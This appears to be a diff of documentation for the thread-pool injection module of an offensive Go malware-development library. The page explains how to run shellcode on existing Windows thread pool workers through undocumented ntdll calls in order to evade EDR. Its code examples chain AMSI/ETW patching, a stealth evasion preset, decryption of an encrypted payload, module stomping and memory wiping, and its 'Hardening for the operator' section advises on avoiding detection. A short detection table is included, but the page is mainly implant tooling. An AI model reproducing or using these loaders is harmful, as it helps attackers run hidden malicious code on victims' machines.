@@ -1,125 +1,209 @@
-# Thread Pool Injection
+---
+package: github.com/oioio-space/maldev/inject
+last_reviewed: 2026-04-27
+reflects_commit: 4798780
+---
 
-> **MITRE ATT&CK:** T1055.001 -- Process Injection: DLL Injection | **D3FEND:** D3-PSA -- Process Spawn Analysis | **Detection:** Low-Medium
+# Thread pool injection
+
+[← injection index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Drop a work item onto the process's default thread pool via the
+undocumented `TpAllocWork` / `TpPostWork` / `TpReleaseWork` triplet in
+`ntdll`. An idle worker thread that already exists picks the item up
+and runs the shellcode as a normal callback. No `CreateThread`, no
+`NtCreateThreadEx`, no APC. Local-only.
 
 ## Primer
 
-Imagine a company has a shared inbox where employees pick up work assignments. Instead of hiring a new employee to do your task (which would be noticed by HR), you drop your task into the shared inbox. One of the existing workers picks it up during their normal workflow and completes it. Nobody was hired, nobody was fired, and the task got done by a regular employee.
+Every Windows process has a default thread pool — a small ring of
+worker threads created by `RtlpInitializeThreadPool` early in process
+startup. The pool's purpose is to dispatch arbitrary work items
+submitted by `kernel32!QueueUserWorkItem`, `ntdll!TpPostWork`, and the
+modern `CreateThreadpoolWork` family. The implant abuses the
+**ntdll-private** layer: `TpAllocWork(callback, ctx, env)` builds a
+`TP_WORK` object whose callback pointer is the shellcode, `TpPostWork`
+pushes it onto the queue, and one of the existing workers dequeues
+and dispatches it.
 
-Thread pool injection abuses the Windows thread pool. Every process has a default thread pool with worker threads that sit idle, waiting for work items. Using the undocumented `TpAllocWork`, `TpPostWork`, and `TpReleaseWork` functions from `ntdll.dll`, you create a work item with your shellcode as the callback function, post it to the pool, and wait for it to complete. An existing worker thread picks up the work item and executes your shellcode.
+The result is execution on a thread that the implant did not create
+and the EDR did not see being created. The same `TP_WORK` object is
+the textbook plumbing every well-behaved Windows process uses dozens of
+times per second; the only anomaly is the callback target itself.
 
-The critical evasion benefit: no `CreateThread`, `CreateRemoteThread`, or `NtCreateThreadEx` calls. The shellcode runs on a pre-existing thread pool thread, which is completely normal behavior for Windows applications. Security products monitoring thread creation see nothing unusual.
-
-## How It Works
+## How it works
 
 ```mermaid
 sequenceDiagram
-    participant Code as Attacker Code
-    participant NT as ntdll.dll
-    participant Pool as Thread Pool
-    participant Worker as Worker Thread
+    participant Impl as Implant
+    participant Nt as ntdll
+    participant Pool as Default thread pool
+    participant W as Worker thread
 
-    Code->>Code: VirtualAlloc(RW) + copy shellcode
-    Code->>Code: VirtualProtect(RX)
-
-    Code->>NT: TpAllocWork(&work, shellcodeAddr, 0, 0)
-    NT-->>Code: work handle
-
-    Code->>NT: TpPostWork(work)
-    NT->>Pool: Enqueue work item
-
-    Pool->>Worker: Dispatch to idle worker
-    Worker->>Worker: Execute shellcode as callback
-
-    Code->>NT: TpWaitForWork(work, FALSE)
-    Note over Code: Blocks until callback completes
-
-    Code->>NT: TpReleaseWork(work)
-    Note over Code: Cleanup
+    Impl->>Impl: VirtualAlloc(RW) + memcpy
+    Impl->>Impl: VirtualProtect(RX)
+    Impl->>Nt: TpAllocWork(&work, sc, 0, 0)
+    Nt-->>Impl: TP_WORK*
+    Impl->>Nt: TpPostWork(work)
+    Nt->>Pool: enqueue
+    Pool->>W: dispatch
+    W->>W: shellcode runs as callback
+    Impl->>Nt: TpWaitForWork(work, false)
+    Note over Impl: blocks until callback returns
+    Impl->>Nt: TpReleaseWork(work)
 ```
 
-**Step-by-step:**
+Steps:
 
-1. **VirtualAlloc(RW)** -- Allocate writable memory in the current process and copy the shellcode.
-2. **VirtualProtect(RX)** -- Flip to execute-read. The two-step avoids the suspicious RWX allocation.
-3. **TpAllocWork** -- Create a thread pool work item. The callback address is the shellcode. Returns a TP_WORK handle.
-4. **TpPostWork** -- Submit the work item to the default thread pool queue.
-5. **Worker execution** -- An existing idle worker thread dequeues the item and calls the shellcode as if it were a normal work callback.
-6. **TpWaitForWork** -- Block until the callback completes (prevents premature cleanup).
-7. **TpReleaseWork** -- Free the work item resources.
-
-## Usage
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // ThreadPoolExec handles allocation, protection, and pool dispatch.
-    if err := inject.ThreadPoolExec(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Combined Example
-
-```go
-package main
-
-import (
-    "log"
-
-    "github.com/oioio-space/maldev/evasion"
-    "github.com/oioio-space/maldev/evasion/amsi"
-    "github.com/oioio-space/maldev/evasion/etw"
-    "github.com/oioio-space/maldev/inject"
-)
-
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // 1. Disable AMSI and ETW before running shellcode.
-    techniques := []evasion.Technique{
-        amsi.ScanBufferPatch(),
-        etw.All(),
-    }
-    if errs := evasion.ApplyAll(techniques, nil); errs != nil {
-        for name, err := range errs {
-            log.Printf("evasion %s: %v", name, err)
-        }
-    }
-
-    // 2. Execute via thread pool -- no new thread created.
-    if err := inject.ThreadPoolExec(shellcode); err != nil {
-        log.Fatal(err)
-    }
-}
-```
-
-## Advantages & Limitations
-
-| Aspect | Detail |
-|--------|--------|
-| Stealth | High -- no thread creation APIs called. Reuses existing worker threads. |
-| API surface | Uses undocumented `TpAllocWork` / `TpPostWork` / `TpReleaseWork` from ntdll. Less likely to be hooked than documented APIs. |
-| Execution model | Synchronous from the caller's perspective (`TpWaitForWork` blocks). The shellcode runs on a pool worker thread. |
-| Compatibility | Windows 7+ (thread pool API is stable but undocumented). |
-| Limitations | Local injection only. The shellcode must be position-independent. If the process has no thread pool initialized yet, `TpAllocWork` initializes one (visible in ETW). |
-| Call stack | The callback call stack originates from `ntdll!TppWorkerThread`, which is normal for any application using the thread pool. |
+1. **Allocate / write / protect** in the current process — RW first,
+   then RX.
+2. **`TpAllocWork`** — register the shellcode as the callback.
+3. **`TpPostWork`** — submit the work item.
+4. **Worker dispatch** — an existing pool worker dequeues and calls the
+   callback (the shellcode).
+5. **`TpWaitForWork`** — block to guarantee completion before
+   `TpReleaseWork` frees the object underneath the running callback.
+6. **`TpReleaseWork`** — clean up.
 
 ## API Reference
 
+### `inject.ThreadPoolExec(shellcode []byte) error`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#ThreadPoolExec)
+
+Execute `shellcode` on the current process's default thread pool. Owns
+allocation (RW → RX), the `TpAllocWork`/`TpPostWork`/`TpWaitForWork`/
+`TpReleaseWork` lifecycle, and cleanup.
+
+**Parameters:**
+- `shellcode` — bytes to execute. The function copies them into a
+  freshly allocated RW page, flips to RX, then dispatches.
+
+**Returns:** `error` — wraps `ntdll` failures and protection-flip
+errors. `nil` only after the shellcode callback returns.
+
+**Side effects:** allocates `len(shellcode)`-rounded-up RX page in the
+current process. The page is **not** released — wipe it with
+[`cleanup/memory.WipeAndFree`](../cleanup/memory-wipe.md) when done.
+
+**OPSEC:** the callback target is the only anomaly. Pair with
+[`ModuleStomp`](module-stomping.md) to make it image-backed.
+
+## Examples
+
+### Simple
+
 ```go
-// ThreadPoolExec executes shellcode via the current process's thread pool.
-// Uses TpAllocWork + TpPostWork + TpReleaseWork from ntdll to schedule
-// shellcode as a worker callback on an existing thread pool thread.
-func ThreadPoolExec(shellcode []byte) error
+import "github.com/oioio-space/maldev/inject"
+
+if err := inject.ThreadPoolExec(shellcode); err != nil {
+    return err
+}
 ```
+
+### Composed (ModuleStomp + manual TpAllocWork)
+
+`ThreadPoolExec` is a one-shot helper. To make the callback target
+image-backed, stomp first and call `TpAllocWork` manually — see
+[`inject/threadpool_windows.go`](../../../inject/threadpool_windows.go)
+for the call shape:
+
+```go
+import "github.com/oioio-space/maldev/inject"
+
+addr, err := inject.ModuleStomp("msftedit.dll", shellcode)
+if err != nil { return err }
+// dispatch via TpAllocWork(addr, ...) — see source for full snippet
+return inject.ExecuteCallback(addr, inject.CallbackRtlRegisterWait)
+```
+
+### Advanced (chain with evasion preset)
+
+```go
+import (
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/inject"
+)
+
+_ = evasion.ApplyAll(preset.Stealth(), nil)
+return inject.ThreadPoolExec(shellcode)
+```
+
+### Complex (decrypt + thread-pool + wipe)
+
+```go
+import (
+    "github.com/oioio-space/maldev/cleanup/memory"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/inject"
+)
+
+_ = evasion.ApplyAll(preset.Stealth(), nil)
+
+shellcode, err := crypto.DecryptAESGCM(aesKey, encrypted)
+if err != nil { return err }
+memory.SecureZero(aesKey)
+
+if err := inject.ThreadPoolExec(shellcode); err != nil { return err }
+memory.SecureZero(shellcode)
+```
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| `TP_WORK` callback pointer outside any image | EDR memory scanners walk active pool work items (CrowdStrike Falcon Sensor, MDE Live Response) |
+| RW → RX flip in current process | `NtProtectVirtualMemory` telemetry — every modern EDR keys on the protection transition |
+| Pool worker stack containing addresses outside any module | Stack-walking telemetry on the thread-pool dispatcher |
+
+**D3FEND counters:**
+
+- [D3-PCSV](https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/)
+  — verifies the callback against image segments.
+- [D3-EAL](https://d3fend.mitre.org/technique/d3f:ExecutableAllowlisting/)
+  — WDAC blocks RX flips outside images.
+
+**Hardening for the operator:** pair with [`ModuleStomp`](module-stomping.md)
+so the callback pointer is image-backed; spread allocations across
+multiple smaller pages to reduce signature surface; sleep-mask the
+shellcode region between activations
+([`evasion/sleepmask`](../evasion/sleep-mask.md)).
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Process Injection: DLL Injection | thread-pool variant — no thread creation | D3-PCSV |
+
+## Limitations
+
+- **Local only.** Targets the current process's pool. There is no
+  cross-process variant — the `TP_WORK` object lives in the calling
+  process.
+- **Synchronous via `TpWaitForWork`.** The helper blocks until the
+  callback returns. Long-running shellcode should detach internally
+  (spawn a fiber or thread).
+- **No CET path.** Unlike `RtlRegisterWait`, the pool dispatcher does
+  not enforce `ENDBR64` on the callback in current shipping builds.
+  Verify on your target build before relying on this.
+- **Region not freed.** The RX page persists until process exit unless
+  the implant calls [`cleanup/memory.WipeAndFree`](../cleanup/memory-wipe.md).
+- **Undocumented APIs.** `TpAllocWork` / `TpPostWork` /
+  `TpReleaseWork` are not in the SDK; future Windows builds may
+  rename or relocate them.
+
+## See also
+
+- [Callback execution](callback-execution.md) — the broader family;
+  thread pool is the worker-thread variant.
+- [Module Stomping](module-stomping.md) — pair to make the callback
+  pointer image-backed.
+- [`evasion/sleepmask`](../evasion/sleep-mask.md) — mask the RX
+  region between dispatches.
+- [Modexp, *Calling Conventions in Windows*](https://modexp.wordpress.com/2019/06/09/threadpoolwait/)
+  — original public write-up of `TpAllocWork`-based injection.
